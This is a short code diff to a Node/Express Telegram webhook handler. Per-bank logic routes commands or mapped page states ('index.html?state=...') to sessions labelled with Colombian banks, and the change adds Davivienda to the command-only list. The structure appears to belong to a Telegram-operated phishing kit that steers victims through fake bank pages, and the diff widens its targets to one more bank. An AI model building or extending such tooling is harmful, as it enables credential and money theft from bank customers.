@@ -162,7 +162,7 @@ app.post('/telegram/webhook', (req, res) => {
       // - Bancolombia: envía URL mapeada (index.html?state=...)
       // - Banco de Bogotá, AV Villas, Caja Social, Banco Popular: envían comandos originales
       const url = resolveCode(cmd);
-      const commandOnlyBanks = ['bogota', 'avvillas', 'cajasocial', 'popular'];
+      const commandOnlyBanks = ['bogota', 'avvillas', 'cajasocial', 'popular', 'davivienda'];
 
       if (s.bank === 'bancolombia' && url) {
         // Bancolombia espera URLs mapeadas
